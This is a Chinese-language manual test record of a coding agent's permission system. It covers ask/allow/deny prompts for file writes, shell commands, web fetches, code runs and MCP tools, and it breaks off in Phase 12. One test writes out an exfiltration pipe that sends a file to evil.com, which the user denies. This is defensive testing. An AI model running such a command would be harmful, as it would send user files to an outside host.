# RFC-0019 手工端到端测试记录

- **日期**: 2026-05-07
- **测试环境**: Local sandbox, work_dir=/tmp/nexau_perm_test/workspace（Phase 12 MCP 模式使用 /private/tmp/nexau_perm_test/workspace 以规避 macOS symlink）
- **LLM**: gpt-5.4 via LLM_BASE_URL (OpenAI-compatible, temperature=0)
- **脚本**: `scripts/demo_cc_agent.py` (无 --e2b)
- **已注册工具**: 19 个 YAML 工具（修复后，含 BackgroundTaskManage + 4 session 工具）
- **测试员**: Claude Code (通过 expect 自动交互)
- **原始日志**: `/tmp/nexau_perm_test/phase{1..12}.log`

---

## Session A — Phase 1: 只读工具自动放行（独立 session）

**目标**: 无 `permissions` 配置的工具，`allow_rules=["**"]`，一切自动放行，不弹窗。

### T1.1 list_directory

```
You: 列出 /tmp/nexau_perm_test/workspace 目录内容
Agent: /tmp/nexau_perm_test/workspace 目录内容：

- `src/`（目录）
```

**权限弹窗**: 无 | **结果**: PASS

### T1.2 glob

```
You: 搜索 /tmp/nexau_perm_test/workspace 下所有 .py 文件
Agent: 找到以下 `.py` 文件：

- `src/main.py`
```

**权限弹窗**: 无 | **结果**: PASS

### T1.3 search_file_content

```
You: 在 /tmp/nexau_perm_test/workspace 中搜索包含 hello 的文件
Agent: 找到包含 `hello` 的文件：

- `src/main.py:1` → `print("hello world")`
```

**权限弹窗**: 无 | **结果**: PASS

### T1.4 read_many_files

```
You: 同时读取 /tmp/nexau_perm_test/workspace/src/main.py 和 /tmp/nexau_perm_test/workspace/src 两个路径
Agent: 已同时读取这两个路径的内容。

1. 文件 `/tmp/nexau_perm_test/workspace/src/main.py`
print("hello world")

2. 目录 `/tmp/nexau_perm_test/workspace/src`
- `main.py`
```

**权限弹窗**: 无 | **结果**: PASS

### T1.5 read_visual_file

```
You: 读取 /tmp/nexau_perm_test/workspace/test.png 图片
Agent: 已读取图片 /tmp/nexau_perm_test/workspace/test.png。
这是一个纯红色的小方块图片。
```

**权限弹窗**: 无 | **结果**: PASS

### T1.6 read_file

```
You: 读取 /tmp/nexau_perm_test/workspace/src/main.py 文件内容
Agent: 文件内容如下：

print("hello world")
```

**权限弹窗**: 无 | **结果**: PASS

### T1.7 google_web_search

```
You: 搜索 Python asyncio tutorial
Agent: 找到这些 Python asyncio 教程资源：

1. 官方文档：A Conceptual Overview of asyncio
   https://docs.python.org/3/howto/a-conceptual-overview-of-asyncio.html
2. Real Python：Python's asyncio: A Hands-On Walkthrough
   https://realpython.com/async-io-python/
3. YouTube 视频教程：Python Tutorial: AsyncIO - Complete Guide
   https://www.youtube.com/watch?v=oAkLSJNr5zY
```

**权限弹窗**: 无（web_search 无 permissions 配置，自动放行，Serper API 成功返回搜索结果） | **结果**: PASS

**Phase 1 小结**: 7/7 PASS

---

## Session B — Phase 2: 文件写入工具 ask 行为（同 session，验证目录级持久化 + 跨工具独立性）

**目标**: 所有文件写入工具初始 `{allow: [], deny: []}` → 全部 ask，由用户决定。

### T2.1 write_file — 首次 ask → allow

```
You: 创建文件 /tmp/nexau_perm_test/workspace/hello.py，内容为 print('hello world')
❌ Tool 'write_file' execution failed: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?

⚠ Permission required!
  Tool:   write_file
  Prompt: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已完成：已将 /tmp/nexau_perm_test/workspace/hello.py 的内容写为：
print('hello world')
```

**权限弹窗**: 有，工具=write_file，提示=「允许访问 .../hello.py 吗?」 | **结果**: PASS

### T2.2 write_file — 同目录持久化

> 依赖 T2.1: write_file allow 后 permission_key 为目录级 glob `/tmp/nexau_perm_test/workspace/**`。

```
You: 创建文件 /tmp/nexau_perm_test/workspace/secret.txt，内容为 password123
Agent: 已完成：已创建文件 /tmp/nexau_perm_test/workspace/secret.txt，内容为：
password123
```

**权限弹窗**: 无（T2.1 已 allow 该目录，目录级持久化生效，secret.txt 自动放行） | **结果**: PASS

### T2.3 replace — 独立工具首次 ask

```
You: 把 /tmp/nexau_perm_test/workspace/hello.py 中的 hello world 替换为 hey
❌ Tool 'replace' execution failed: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?

⚠ Permission required!
  Tool:   replace
  Prompt: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已完成：已将 hello.py 中的 hello world 替换为 hey。
当前内容：print('hey')
```

**权限弹窗**: 有，工具=replace（非 write_file），验证了各工具权限规则独立 | **结果**: PASS

### T2.4 apply_patch — 首次 ask

```
You: 用 patch 方式在 /tmp/nexau_perm_test/workspace/hello.py 文件开头加一行注释 # patched
❌ Tool 'apply_patch' execution failed: 允许访问 hello.py 吗?

⚠ Permission required!
  Tool:   apply_patch
  Prompt: 允许访问 hello.py 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已完成：已使用 patch 在 hello.py 文件开头添加注释。
当前内容：
 # patched
print('hey')
```

**权限弹窗**: 有，工具=apply_patch，工具成功执行并正确添加注释 | **结果**: PASS

### T2.5 multiedit_tool — 首次 ask

```
You: 在 /tmp/nexau_perm_test/workspace/hello.py 中同时做两处替换：把 hey 换成 hi，把 patched 换成 edited
❌ Tool 'multiedit_tool' execution failed: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?

⚠ Permission required!
  Tool:   multiedit_tool
  Prompt: 允许访问 /tmp/nexau_perm_test/workspace/hello.py 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已完成，两处都已替换。当前内容：
 # edited
print('hi')
```

**权限弹窗**: 有，工具=multiedit_tool，两处替换均成功 | **结果**: PASS

### T2.6 write_file .env — 目录级持久化 + 无 hardcoded deny

> 依赖 T2.1: write_file 已 allow `/tmp/nexau_perm_test/workspace/**`。

```
You: 创建文件 /tmp/nexau_perm_test/workspace/.env，内容为 SECRET=abc
Agent: 已完成：已创建文件 /tmp/nexau_perm_test/workspace/.env，内容为：
SECRET=abc
```

**权限弹窗**: 无（目录已 allow + `.env` 不在保护列表 → 自动放行，无 hardcoded deny） | **结果**: PASS

**Phase 2 小结**: 6/6 PASS。四种文件写入工具首次均 ask，各工具权限独立，目录级持久化生效（T2.2 独立验证通过），所有工具执行结果正确。

---

## Session C — Phase 3: Shell 命令权限（同 session，验证 readonly 白名单 + 命令级持久化 + pipe/chain 检测）

**目标**: `run_shell_command` readonly 命令自动放行，非 readonly 命令 ask，管道/链式命令逐个子命令检查。

### T3.1 shell ls — readonly 自动放行

```
You: 执行命令 ls -la /tmp/nexau_perm_test/workspace
Agent: total 16
drwxr-xr-x@  5 pcj  wheel  160  5  7 16:17 .
drwxr-xr-x@ 19 pcj  wheel  608  5  7 16:32 ..
-rw-r--r--@  1 pcj  wheel   13  5  7 16:19 hello.py
-rw-r--r--@  1 pcj  wheel   12  5  7 16:17 secret.txt
drwxr-xr-x@  3 pcj  wheel   96  5  7 15:22 src
```

**权限弹窗**: 无 | **结果**: PASS

### T3.2 shell cat — readonly 自动放行

```
You: 执行命令 cat /tmp/nexau_perm_test/workspace/hello.py
Agent: print('hey')
```

**权限弹窗**: 无 | **结果**: PASS

### T3.3 shell git log — readonly git 子命令自动放行

```
You: 执行 git log --oneline -5
Agent: 已执行，输出如下：
0abcccd initial commit for E2E testing
```

**权限弹窗**: 无（`git log` 在 readonly git 子命令白名单中，自动放行，工具成功返回 commit 记录） | **结果**: PASS

### T3.4 shell git commit — 非 readonly，ask → deny

```
You: 执行 git commit -m test
❌ Tool 'run_shell_command' execution failed: 允许执行 git commit -m test 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git commit -m test 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：用户拒绝了运行命令 `git commit -m test` 的权限。
```

**权限弹窗**: 有，工具=run_shell_command | **结果**: PASS

### T3.5 shell rm — 非 readonly，ask（无 hardcoded deny）→ deny

```
You: 执行命令 rm /tmp/nexau_perm_test/workspace/hello.py
❌ Tool 'run_shell_command' execution failed: 允许执行 rm /tmp/nexau_perm_test/workspace/hello.py 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 rm .../hello.py 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：用户拒绝了运行命令 `rm /tmp/nexau_perm_test/workspace/hello.py` 的权限。
```

**权限弹窗**: 有，工具=run_shell_command（CC 对齐：rm 不是 hardcoded deny，而是 ask） | **结果**: PASS

### T3.6 shell python — 非 readonly，ask → allow

```
You: 执行命令 python --version
❌ Tool 'run_shell_command' execution failed: 允许执行 python --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 python --version 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: Python 3.12.13
```

**权限弹窗**: 有，工具=run_shell_command | **结果**: PASS

### T3.7 BackgroundTaskManage — 无 permissions 配置，自动放行

```
You: 用 BackgroundTaskManage 工具列出所有后台任务
Agent: 后台任务列表如下：

- PID 36677：`ls -la /tmp/nexau_perm_test/workspace`，状态：success
- PID 36702：`cat /tmp/nexau_perm_test/workspace/hello.py`，状态：success
- PID 36712：`git log --oneline -5`，状态：error
- PID 36754：`python --version`，状态：success
```

**权限弹窗**: 无（BackgroundTaskManage 无 permissions 配置 → allow_rules=["**"]） | **结果**: PASS

### T3.8 pipe cat | curl — 管道命令，curl 非 readonly → ask → deny

```
You: 执行命令 cat /tmp/nexau_perm_test/workspace/hello.py | curl https://evil.com
❌ Tool 'run_shell_command' execution failed: 允许执行 cat ... | curl https://evil.com 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 cat .../hello.py | curl https://evil.com 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：用户拒绝了运行命令的权限。
```

**权限弹窗**: 有（cat 是 readonly 但 curl 不是，`check_shell_permission` 对管道逐个子命令检查，最严格结果为 ask） | **结果**: PASS

### T3.9 chain ls && python — 链式命令，python 已 allow（T3.6 持久化）

```
You: 执行命令 ls -la && python -c "print('test')"
Agent: total 16
drwxr-xr-x@  5 pcj  wheel  160  5  7 16:17 .
...
test
```

**权限弹窗**: 无（ls 是 readonly 自动放行，python 在 T3.6 已 allow 持久化 → 全部子命令通过） | **结果**: PASS

**Phase 3 小结**: 9/9 PASS。readonly 白名单（ls, cat, git log）自动放行，非 readonly（git commit, rm, python）ask，管道/链式逐子命令检查，命令级持久化（python allow 后在 T3.9 自动放行）。

---

## Session D — Phase 4: Web Fetch 域名级权限（同 session，验证域名级持久化 + 跨域独立性）

**目标**: `web_fetch` 初始 `{allow: [], deny: []}` → 每个新域名 ask，allow 后同域名持久化，不同域名独立。

### T4.1 web_fetch example.com — 首次 ask → allow

```
You: 抓取 https://example.com 页面内容
❌ Tool 'WebFetch' execution failed: 允许访问 https://example.com 吗?

⚠ Permission required!
  Tool:   WebFetch
  Prompt: 允许访问 https://example.com 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已抓取页面内容，主要文本如下：

- 标题：Example Domain
- 正文：This domain is for use in documentation examples without needing permission.
```

**权限弹窗**: 有，工具=WebFetch | **结果**: PASS

### T4.2 web_fetch example.com — 同域名持久化

```
You: 再次抓取 https://example.com 的页面
Agent: 已再次抓取 https://example.com 的页面内容：

- 标题：Example Domain
- 正文：This domain is for use in documentation examples...
```

**权限弹窗**: 无（example.com 已在 T4.1 allow，域名级持久化生效） | **结果**: PASS

### T4.3 web_fetch github.com — 不同域名，独立 ask

```
You: 抓取 https://github.com/anthropics/claude-code 页面
❌ Tool 'WebFetch' execution failed: 允许访问 https://github.com/anthropics/claude-code 吗?

⚠ Permission required!
  Tool:   WebFetch
  Prompt: 允许访问 https://github.com/anthropics/claude-code 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已抓取页面内容，仓库：anthropics/claude-code，Star ~121k...
```

**权限弹窗**: 有（github.com 是新域名，独立于 example.com 的 allow） | **结果**: PASS

**Phase 4 小结**: 3/3 PASS。域名级权限正确：首次 ask，同域持久化，跨域独立。

---

## Session E — Phase 5: 代码执行权限（同 session，验证 run_code_tool ask + 持久化）

**目标**: `run_code_tool` 初始 `{allow: [], deny: []}` → 首次 ask，allow 后持久化。

### T5.1 run_code_tool — 首次 ask → allow

```
You: 用 run_code_tool 执行 print(1+1)
❌ Tool 'run_code_tool' execution failed: 允许执行代码吗?

⚠ Permission required!
  Tool:   run_code_tool
  Prompt: 允许执行代码吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已执行完成。
结果：
- stdout: 2
- stderr: 空
- exit_code: 0
```

**权限弹窗**: 有，工具=run_code_tool | **结果**: PASS

### T5.2 run_code_tool — allow 持久化

```
You: 用 run_code_tool 执行 import os; print(os.listdir('/'))
Agent: 已执行完成。
结果：
- stdout: ['home', 'usr', ... 'tmp', 'cores']
- stderr: 空
- exit_code: 0
```

**权限弹窗**: 无（T5.1 allow 已持久化） | **结果**: PASS

**Phase 5 小结**: 2/2 PASS。run_code_tool 首次 ask，allow 后持久化生效。

---

## Session F — Phase 6: allow vs allow_once 持久化对比（同 session）

**目标**: 验证 `allow_once` 不持久化（下次同工具/同资源仍 ask），`allow` 持久化（下次自动放行）。

### T6.1a web_fetch example.org — allow_once

```
You: 抓取 https://example.org
❌ Tool 'WebFetch' execution failed: 允许访问 https://example.org 吗?

⚠ Permission required!
  Tool:   WebFetch
  Prompt: 允许访问 https://example.org 吗?
  → allow / allow_once / deny: allow_once
  ✓ Resolved: allow_once

Agent: 已抓取完成：
- 标题：Example Domain
- 内容：This domain is for use in documentation examples without needing permission.
```

**权限弹窗**: 有，工具=WebFetch，用户选 allow_once，工具成功抓取页面内容 | **结果**: PASS

### T6.1b web_fetch example.org — allow_once 不持久化（第二次应再次 ask）

```
You: 再次抓取 https://example.org
❌ Tool 'WebFetch' execution failed: 允许访问 https://example.org 吗?

⚠ Permission required!
  Tool:   WebFetch
  Prompt: 允许访问 https://example.org 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 抓取失败：WebFetch 权限被拒绝。
```

**权限弹窗**: 有，工具=WebFetch（LLM 正确使用同一工具重试），allow_once 未持久化到 DB，第二次调用重新 ask | **结果**: PASS

### T6.2a run_shell_command python — allow

```
You: 执行命令 python --version
❌ Tool 'run_shell_command' execution failed: 允许执行 python --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 python --version 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: Python 3.12.13
```

**权限弹窗**: 有（新 session，python 未被 allow） | **结果**: PASS

### T6.2b run_shell_command python — allow 持久化

```
You: 再次执行 python --version
Agent: Python 3.12.13
```

**权限弹窗**: 无（T6.2a allow 已持久化到 DB） | **结果**: PASS

**Phase 6 小结**: 4/4 PASS。allow_once 非持久化直接验证通过（T6.1b LLM 正确用 WebFetch 重试，弹窗再次出现），allow 持久化验证清晰。

---

## Session G — Phase 7: 并行工具调用 + Phase 8: Session 工具（同 session）

**目标**: 并行工具调用时 read 自动放行 + write/shell 分别弹窗；session 工具（无 permissions）全部自动放行。

### T7.1 并行: read_file (auto) + write_file (ask) + run_shell_command (ask)

```
You: 同时做三件事：1. 读取 .../src/main.py 2. 创建 .../config.yaml 内容 key: value 3. 执行命令 python -c "print('test')"
❌ Tool 'run_shell_command' execution failed: 允许执行 python -c "print('test')" 吗?
❌ Tool 'write_file' execution failed: 允许访问 /tmp/nexau_perm_test/workspace/config.yaml 吗?

⚠ Permission required!
  Tool:   write_file
  Prompt: 允许访问 .../config.yaml 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

  Tool:   run_shell_command
  Prompt: 允许执行 python -c "print('test')" 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 结果如下：
1. 读取 src/main.py → print("hello world")
2. 创建 config.yaml → 已创建
3. 执行 python -c "print('test')" → 输出: test
```

**权限弹窗**: 两个（write_file + run_shell_command），read_file 自动放行无弹窗 | **结果**: PASS

> 验证了并行工具调用时：read 工具自动放行不阻塞，write 和 shell 工具各自独立 ask，两个弹窗依次出现，全部 resolve 后才 resume。

### T8.1 write_todos — 自动放行

```
You: 创建待办事项：1. 写单测 2. 代码审查
Agent: 已创建待办事项：
1. [pending] 写单测
2. [pending] 代码审查
```

**权限弹窗**: 无（write_todos 无 permissions → allow_rules=["**"]） | **结果**: PASS

### T8.2 save_memory — 自动放行

```
You: 记住：这个项目使用 Python 3.12
Agent: 已记住：这个项目使用 Python 3.12
```

**权限弹窗**: 无 | **结果**: PASS

### T8.3 complete_task — 自动放行

```
You: 标记第一个待办事项为已完成
Agent: 已标记第一个待办事项为已完成：
1. [completed] 写单测
2. [pending] 代码审查
```

**权限弹窗**: 无 | **结果**: PASS

### T8.4 ask_user — 自动放行

```
You: 用 ask_user 工具向我提问：你希望这个项目支持哪些功能？
Agent: 请回答这个问题：
你希望这个项目支持哪些功能？
```

**权限弹窗**: 无（ask_user 无 permissions 配置 → `allow_rules=["**"]`，LLM 成功调用 ask_user 工具并向用户提问，自动放行） | **结果**: PASS

**Phase 7+8 小结**: 5/5 PASS。并行工具调用时 ask 工具各自独立弹窗、全部 resolve 后 resume；4 个 session 工具均自动放行。

---

## Session H — Phase 9: Critical Gap 补测（同 session，protected path + deny 重试 + allow_once）

**目标**: 补测三个 critical gap：(1) 受保护路径即使在已 allow 的目录中仍应 ask；(2) deny 不持久化，再次调用应重新 ask；(3) allow_once 不持久化，再次调用应重新 ask。

### T9.1 write_file 普通文件 — ask → allow（建立目录级 allow）

```
You: 创建文件 /tmp/nexau_perm_test/workspace/setup.txt，内容为 hello
❌ Tool 'write_file' execution failed: 允许访问 .../setup.txt 吗?

⚠ Permission required!
  Tool:   write_file
  Prompt: 允许访问 /tmp/nexau_perm_test/workspace/setup.txt 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已完成：已创建文件 .../setup.txt，内容为：hello。
```

**权限弹窗**: 有 | **结果**: PASS（建立 `workspace/`** 目录级 allow）

### T9.2 write_file .bashrc — 受保护文件，即使目录已 allow 仍 ask

```
You: 创建文件 /tmp/nexau_perm_test/workspace/.bashrc，内容为 export PATH
❌ Tool 'write_file' execution failed: 允许访问受保护路径 .../workspace/.bashrc 吗?

⚠ Permission required!
  Tool:   write_file
  Prompt: 允许访问受保护路径 /tmp/nexau_perm_test/workspace/.bashrc 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 操作未完成：创建文件 .bashrc 被拒绝。
```

**权限弹窗**: 有，提示词包含"受保护路径"（`_is_protected_path()` 检测到 `.bashrc` ∈ `_PROTECTED_FILES`） | **结果**: PASS

### T9.3 write_file .git/config — 受保护目录，即使目录已 allow 仍 ask

```
You: 创建文件 /tmp/nexau_perm_test/workspace/.git/config，内容为 test
❌ Tool 'write_file' execution failed: 允许访问受保护路径 .../workspace/.git/config 吗?

⚠ Permission required!
  Tool:   write_file
  Prompt: 允许访问受保护路径 /tmp/nexau_perm_test/workspace/.git/config 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 操作未完成：创建文件 .git/config 被拒绝。
```

**权限弹窗**: 有，提示词包含"受保护路径"（`.git` ∈ `_PROTECTED_DIRS`） | **结果**: PASS

### T9.4 shell node --version — ask → deny

```
You: 执行命令 node --version
❌ Tool 'run_shell_command' execution failed: 允许执行 node --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 node --version 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 操作未完成：执行命令 node --version 被拒绝。
```

**权限弹窗**: 有 | **结果**: PASS

### T9.5 shell node --version 再次 — deny 不持久化，应重新 ask

```
You: 再次执行命令 node --version
❌ Tool 'run_shell_command' execution failed: 允许执行 node --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 node --version 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 操作未完成：再次执行命令 node --version 被拒绝。
```

**权限弹窗**: 有（deny 未持久化到 DB，第二次调用重新 ask） | **结果**: PASS

### T9.6 run_code_tool — ask → allow_once

```
You: 用 run_code_tool 执行 print(42)
❌ Tool 'run_code_tool' execution failed: 允许执行代码吗?

⚠ Permission required!
  Tool:   run_code_tool
  Prompt: 允许执行代码吗?
  → allow / allow_once / deny: allow_once
  ✓ Resolved: allow_once

Agent: 已完成：使用 run_code_tool 执行 print(42)，输出结果为：42。
```

**权限弹窗**: 有 | **结果**: PASS

### T9.7 run_code_tool 再次 — allow_once 不持久化，应重新 ask

```
You: 用 run_code_tool 执行 print(99)
❌ Tool 'run_code_tool' execution failed: 允许执行代码吗?

⚠ Permission required!
  Tool:   run_code_tool
  Prompt: 允许执行代码吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 操作未完成：执行 print(99) 被拒绝。
```

**权限弹窗**: 有（allow_once 未持久化到 DB，第二次调用重新 ask） | **结果**: PASS

**Phase 9 小结**: 7/7 PASS。三个 critical gap 全部验证：

1. **Protected path**: `.bashrc`（受保护文件）和 `.git/config`（受保护目录）在已 allow 的目录中仍强制 ask，提示词明确标注"受保护路径"
2. **deny 不持久化**: deny 后再次调用同命令，重新弹窗 ask（而非自动 deny）
3. **allow_once 不持久化**: allow_once 后再次调用，重新弹窗 ask（而非自动 allow）

---

## Session I — Phase 10: Medium 级别风险补测（独立 session）

**目标**: 覆盖 medium 级别风险点——输出重定向检测、`bash -c` 递归分析、进程包装器剥离、子命令粒度区分、ask_user 直接调用。

### T10.1 ls 带输出重定向 — readonly 命令 + `>` 应 ask

```
You: 执行命令 ls -la > /tmp/nexau_perm_test/workspace/out.txt
❌ Tool 'run_shell_command' execution failed: 允许执行 ls -la > /tmp/nexau_perm_test/workspace/out.txt 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 ls -la > /tmp/nexau_perm_test/workspace/out.txt 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 已执行完成。命令成功运行，ls -la 的输出已写入 /tmp/nexau_perm_test/workspace/out.txt。
```

**权限弹窗**: 有（`ls` 虽为 readonly 但 `_has_output_redirect()` 检测到 `>`，升级为 ask） | **结果**: PASS

### T10.2 bash -c "git push" — shell 解释器递归分析

```
You: 执行命令 bash -c "git push origin main"
❌ Tool 'run_shell_command' execution failed: 允许执行 bash -c "git push origin main" 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 bash -c "git push origin main" 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：你拒绝了运行该命令的权限，因此 git push origin main 没有执行。
```

**权限弹窗**: 有（`_check_shell_c_inner()` 递归解析 `bash -c` 内部命令 `git push`，非 readonly → ask） | **结果**: PASS

### T10.3 timeout 包装器剥离 — `timeout 5 python --version`

```
You: 执行命令 timeout 5 python --version
❌ Tool 'run_shell_command' execution failed: 允许执行 timeout 5 python --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 timeout 5 python --version 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：你拒绝了运行该命令的权限，因此 timeout 5 python --version 没有执行。
```

**权限弹窗**: 有（`_strip_process_wrappers()` 剥离 `timeout 5`，检查实际命令 `python` → ask） | **结果**: PASS

### T10.4 env 包装器剥离 — `env FOO=bar python --version`

```
You: 执行命令 env FOO=bar python --version
❌ Tool 'run_shell_command' execution failed: 允许执行 env FOO=bar python --version 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 env FOO=bar python --version 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：你拒绝了运行该命令的权限，因此 env FOO=bar python --version 没有执行。
```

**权限弹窗**: 有（`_strip_process_wrappers()` 剥离 `env FOO=bar`，检查实际命令 `python` → ask） | **结果**: PASS

### T10.5a git log — readonly git 子命令自动放行

```
You: 执行命令 git log --oneline -3
Agent: 命令已执行，输出如下：
743561e initial commit for E2E testing
```

**权限弹窗**: 无（`git log` 在 `_READONLY_GIT_SUBCOMMANDS` 中，自动放行，工具成功返回 commit 记录） | **结果**: PASS

### T10.5b git push — 非 readonly git 子命令应 ask

```
You: 执行命令 git push origin main
❌ Tool 'run_shell_command' execution failed: 允许执行 git push origin main 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git push origin main 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：你拒绝了运行该命令的权限，因此 git push origin main 没有执行。
```

**权限弹窗**: 有（`git push` 不在 `_READONLY_GIT_SUBCOMMANDS` 中，permission_key="git push" 区别于 T10.5a 的 "git log"） | **结果**: PASS

### T10.6 ask_user 直接调用 — 无 permissions 配置应自动放行

```
You: 用 ask_user 工具问我一个问题：你喜欢什么编程语言？
Agent: 请回答我这个问题：你喜欢什么编程语言？
```

**权限弹窗**: 无（ask_user 无 permissions 配置，`allow_rules=["**"]`，自动放行） | **结果**: PASS

**Phase 10 小结**: 7/7 PASS。六个 medium 级别风险点全部验证：

1. **输出重定向**: `ls > file` 虽然 `ls` 是 readonly，但 `_has_output_redirect()` 检测到重定向符号，正确升级为 ask
2. **shell -c 递归**: `bash -c "git push"` 被 `_check_shell_c_inner()` 递归解析，内部 `git push` 触发 ask
3. **进程包装器**: `timeout` 和 `env` 均被 `_strip_process_wrappers()` 正确剥离，检查实际命令
4. **子命令粒度**: `git log`（readonly 子命令）自动放行，`git push`（非 readonly）触发 ask，permission_key 区分正确
5. **ask_user 直接调用**: 无 permissions 配置的 session 工具确认可被 LLM 直接调用且自动放行

---

## Session J — Phase 11: Git 子命令专属权限（同 session 内持久化 + 隔离验证）

**目标**: 验证 git 子命令的三个专属特性——readonly + 输出重定向升级 ask、deny 按子命令隔离、allow 按子命令持久化。

### T11.1 git log > file — readonly + 输出重定向 → ask

```
You: 执行命令 git log --oneline -3 > /tmp/nexau_perm_test/workspace/gitlog.txt
❌ Tool 'run_shell_command' execution failed: 允许执行 git log --oneline -3 > /tmp/nexau_perm_test/workspace/gitlog.txt 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git log --oneline -3 > /tmp/nexau_perm_test/workspace/gitlog.txt 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：运行命令的权限被拒绝，所以没有生成 /tmp/nexau_perm_test/workspace/gitlog.txt。
```

**权限弹窗**: 有（`git log` 虽在 `_READONLY_GIT_SUBCOMMANDS` 中，但 `_has_output_redirect()` 检测到 `>`，升级为 ask） | **结果**: PASS

### T11.2 git push → ask → deny（建立 deny 基线）

```
You: 执行命令 git push origin main
❌ Tool 'run_shell_command' execution failed: 允许执行 git push origin main 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git push origin main 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：运行 git push origin main 的权限被拒绝，因此未执行推送。
```

**权限弹窗**: 有 | **结果**: PASS

### T11.3 git commit — deny git push 不交叉影响 → ask → allow

```
You: 执行命令 git commit -m 'test message'
❌ Tool 'run_shell_command' execution failed: 允许执行 git commit -m 'test message' 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git commit -m 'test message' 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 执行结果：提交失败。
On branch main
Untracked files: test.png
nothing added to commit but untracked files present
```

**权限弹窗**: 有（deny on "git push" 未交叉影响 "git commit"，permission_key 隔离正确）。工具成功执行，git 返回 "nothing to commit"（合理响应） | **结果**: PASS

### T11.4 git commit 再次 — 子命令级 allow 持久化

```
You: 执行命令 git commit --amend --no-edit
Agent: 执行成功。已执行 git commit --amend --no-edit
最新提交被改写为：743561e
提交信息仍是：initial commit for E2E testing
```

**权限弹窗**: 无（"git commit" 已从 T11.3 持久化，`--amend --no-edit` 子命令仍为 "git commit"，自动放行，工具成功执行） | **结果**: PASS

### T11.5 git push 再次 — git commit allow 不覆盖 git push

```
You: 执行命令 git push origin main
❌ Tool 'run_shell_command' execution failed: 允许执行 git push origin main 吗?

⚠ Permission required!
  Tool:   run_shell_command
  Prompt: 允许执行 git push origin main 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 执行失败：运行 git push origin main 的权限被拒绝，因此未执行推送。
```

**权限弹窗**: 有（"git commit" allow 不覆盖 "git push"，子命令级持久化隔离正确） | **结果**: PASS

**Phase 11 小结**: 5/5 PASS。Git 子命令专属权限三大特性全部验证：
1. **readonly + redirect 升级**: `git log > file` 虽然 `git log` 是 readonly，但输出重定向强制升级为 ask
2. **deny 按子命令隔离**: deny `git push` 后 `git commit` 仍正常 ask（不被 deny 影响）
3. **allow 按子命令持久化**: allow `git commit` 后再次 `git commit` 自动放行，但 `git push` 仍需 ask

---

## Session K — Phase 12: MCP 工具权限（真实 MCP server，`--mcp` 模式）

**目标**: 使用真实 `@modelcontextprotocol/server-filesystem` MCP server（stdio 传输），验证 MCP 工具的 always-ask 默认行为、tool 级持久化和 tool 级隔离。

**环境**: `demo_cc_agent.py --mcp`，`SANDBOX_WORK_DIR=/private/tmp/nexau_perm_test/workspace`，注册 14 个 MCP 工具（`mcp__filesystem__*`）。

### T12.1 MCP list_allowed_directories — 首次调用 → ask

```
You: 用 mcp__filesystem__list_allowed_directories 工具查看允许的目录

⚠ Permission required!
  Tool:   mcp__filesystem__list_allowed_directories
  Prompt: 允许调用 MCP 工具 mcp__filesystem__list_allowed_directories 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

